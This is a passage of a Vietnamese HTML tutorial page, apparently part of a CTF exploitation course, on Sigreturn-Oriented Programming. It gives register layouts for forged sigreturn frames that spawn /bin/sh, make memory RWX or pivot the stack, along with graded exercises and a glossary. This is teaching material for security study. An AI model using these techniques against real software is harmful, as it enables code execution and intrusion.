+  <div class="secnum">10 / BIẾN THỂ</div>
+  <h2>SROP làm được nhiều hơn execve</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Mục tiêu</th><th>Frame</th></tr></thead>
+    <tbody>
+      <tr><td>execve("/bin/sh")</td><td>rax=59, rdi=binsh, rip=syscall</td></tr>
+      <tr><td>mprotect RWX</td><td>rax=10, rdi=page, rsi=0x1000, rdx=7, rip=syscall</td></tr>
+      <tr><td>Stack pivot</td><td>frame.rsp = vùng mới + frame.rip = gadget</td></tr>
+      <tr><td>Chuỗi SROP</td><td>frame.rip = syscall, rsp trỏ frame kế → lặp</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>sigreturn = nr 119 (<code>int 0x80</code>), frame layout khác (sigcontext 32-bit). pwntools SigreturnFrame theo context.arch. ARM cũng có sigreturn.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · SROP execve</div><p>Static có pop rax + syscall + "/bin/sh": dựng frame execve.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · read trả 15</div><p>Không có pop rax: ép rax=15 qua read trả về.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐⭐ · Chuỗi SROP</div><p>SROP read ghi "/bin/sh" vào bss → SROP execve(bss).</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">SROP</div><p>Sigreturn-Oriented Programming.</p></div>
+    <div class="card"><div class="term">sigcontext frame</div><p>Struct 0xf8 byte chứa mọi reg.</p></div>
+    <div class="card"><div class="term">rt_sigreturn</div><p>syscall 15 (x86-64).</p></div>
+    <div class="card"><div class="term">SigreturnFrame</div><p>pwntools dựng frame.</p></div>
+    <div class="card"><div class="term">read trả 15</div><p>Mẹo set rax=15 không pop rax.</p></div>
+    <div class="card"><div class="term">cs/ss</div><p>Segment 0x33/0x2b phải đúng.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="rop_basics.html">rop_basics</a> · <a href="ret2syscall_mprotect.html">ret2syscall</a>. Thay thế khi gadget nghèo: <a href="ret2csu.html">ret2csu</a>.</li>
+    <li>"Framing Signals — A Return to Portable Shellcode" (Bosman &amp; Bos, 2014) · pwntools SigreturnFrame docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 11.</strong> SROP: rax=15 + syscall → sigreturn khôi phục MỌI reg từ frame giả. Set rax=59,rdi=binsh,rip=syscall → execve. Chỉ cần 1 syscall gadget. Nhớ cs/ss (dùng SigreturnFrame). Tiếp theo: stack pivot.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("srop-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("srop-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
